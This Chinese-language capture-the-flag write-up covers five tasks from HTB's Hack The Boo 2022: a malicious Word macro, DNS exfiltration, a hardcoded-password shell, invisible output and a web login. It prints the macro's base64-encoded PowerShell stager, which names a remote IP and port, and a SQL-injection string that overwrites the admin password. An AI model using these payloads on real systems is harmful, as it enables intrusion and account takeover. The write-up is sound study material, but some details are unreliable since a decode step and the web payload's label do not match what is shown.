---
title: Hack The Boo 2022 CTF题目解析
contest: Hack The Boo 2022 (HTB)
year: 2022
difficulty: medium
vuln_type: misc_unknown
tags: [htb, halloween, forensics, rev, pwn, web, olevba, base64, docker]
attack_chain:
  - 第1题: olevba 提取 invitation.docm 宏
  - decodeAsHex + decodeChar 还原 base64
  - echo "JABzAD0A..." | base64 -d → HTB{5up3r_345y_m4cr05}
  - 第2题 DNS流量分析: tshark -r capture.pcap
  - rev: base64 + rev
  - HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
  - pwn: strcmp("sup3r_s3cr3t_p455w0rd_f0r_u!") + system("/bin/sh")
  - rev: printf 不可见字符过滤
  - HTB{h4unt3d_by_th3_gh0st5_0f_ctf5_p45t!}
  - web: PHP type juggling $2a$12 hash + docker
key_payload: olevba.py invitation.docm → base64 -d → HTB{5up3r_345y_m4cr05}
one_liner: HTB Hack The Boo 2022：10题Halloween主题（Forensics+Rev+Pwn+Web）
lesson: olevba是提取Office宏的标配工具
quality: high
---

# Hack The Boo 2022 CTF题目解析

## 题目信息
- 比赛：Hack The Boo 2022 (HTB)
- 类别：Halloween 综合（Forensics + Rev + Pwn + Web）
- 工具：olevba

## 关键攻击链
### 1. Forensics: halloween_invitation
```bash
python3 olevba.py /home/kali/hacktheboo2022/forensics/halloween_invitation/invitation.docm
# 提取宏
```

```python
def decodeAsHex(str): return "".join([chr(int(str[i:i+2], 16)) for i in range(0, len(str), 2)])
def decodeChar(str): return "".join([chr(int(s)) for s in str.split(' ')])
def getBase64EncodedPayload():
    command = ""
    # 多段 hex 字符串拼接
    ...
print(getBase64EncodedPayload())
```

```bash
echo "JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAA..." | base64 -d
# HTB{5up3r_345y_m4cr05}
```

### 2. DNS 流量分析
```bash
tshark -r capture.pcap -T fields -e dns.qry.name > a.txt
cat a.txt | uniq > b.txt
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
# HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```

### 3. Pwn: 字符串比较
```c
if (!strcmp(s, "sup3r_s3cr3t_p455w0rd_f0r_u!")) {
    system("/bin/sh");
}
```

### 4. Rev: 不可见字符
```c
flag = (const char *)get_flag(argc, argv, envp);
printf("%sr|\x1B[4m%*.c\x1B[24m| I've managed to trap the flag ghost in this box, but it's turned invisible!\n", flag, 40, 95LL);
```

### 5. Web: PHP type juggling
```
{"username":"admin","$2a$12$m5lXqzyKreZcVbB/sxR1rOJGbyo.7oHWwI83x8N31/LDCTNhzOhp2")
ON DUPLICATE KEY UPDATE password="$2a$12$m5lXqzyKreZcVbB/sxR1rOJGbyo.7oHWwI83x8N31/LDCTNhzOhp2"#"}
```

## 评分
- quality: high（Halloween 综合 10 题：Forensics + Rev + Pwn + Web）
